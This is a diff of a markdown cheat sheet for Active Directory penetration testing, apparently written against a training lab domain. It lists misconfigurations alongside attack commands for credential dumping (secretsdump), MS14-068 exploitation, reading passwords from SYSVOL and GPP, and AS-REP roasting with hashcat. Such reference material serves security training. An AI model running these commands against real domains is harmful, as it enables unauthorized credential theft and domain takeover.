@@ -116,7 +116,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA
 | **Unpatched MS14-068**                          | Kerberos PAC forgery, escalate to Domain Admin           | `python ms14-068.py -u user -p pass -d domain -s <dc-ip>`                                                  |
 | **Weak/default LDAP credentials in devices**    | Credential sniffing, initial foothold                    | `nc -lvp 389`<br>Change LDAP IP in device/printer config                                                   |
 | **AD DNS zone readable by users**               | DNS record enumeration, host discovery                   | `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`<br>`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r` |
-| **Passwords in user Description/Notes fields**  | Credential discovery, lateral movement                   | `Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}`                             |
+| **Passwords in user Description/Notes fields**  | Credential discovery, lateral movement                   | `Get-DomainUser * &#124; Select-Object samaccountname,description &#124; Where-Object {$_.Description -ne $null}`                             |
 | **PASSWD_NOTREQD flag set on accounts**         | Weak/no password, easy brute-force or login              | `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`                     |
 | **SYSVOL/scripts readable by all**              | Passwords in scripts, privilege escalation               | `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`<br>`cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs` |
 | **GPP cpassword in SYSVOL**                     | Decrypt local admin passwords, lateral movement          | `gpp-decrypt <cpassword>`<br>`crackmapexec smb -M gpp_password`<br>`Get-GPPPassword.ps1`                   |
@@ -173,5 +173,3 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 ```
 ```
-
-This version is much more concise, showing just the essential commands for each method without the verbose output, making it clean and easy to reference quickly.
